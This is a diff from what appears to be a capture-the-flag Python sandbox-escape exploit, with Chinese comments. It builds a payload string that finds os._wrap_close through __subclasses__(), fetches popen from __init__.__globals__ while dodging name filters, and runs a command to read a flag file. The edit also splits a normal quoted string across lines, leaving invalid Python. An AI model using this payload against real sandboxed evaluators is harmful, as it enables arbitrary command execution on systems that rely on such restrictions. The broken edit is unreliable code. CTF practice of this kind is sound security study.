@@ -189,7 +189,10 @@ cmd_payload = (
 # 最终的 Payload 结构
 payload = (
     # 1. 找到 os._wrap_close 类
-    "lit(i for i in lit.__base__.__subclasses__()if lit(dic(wrap_close=1)).pop()in lit.__base__.__str__(i)).pop()"
+    "lit(
+    i for i in lit.__base__.__subclasses__()
+    if lit(dic(wrap_close=1)).pop()in  lit.__base__.__str__(i)
+    ).pop()"
     # 2. 初始化并获取 popen 函数
     ".__init__.__globals__.get(lit(dic(popen=1)).pop())"
     # 3. 执行命令 (cat<flag)
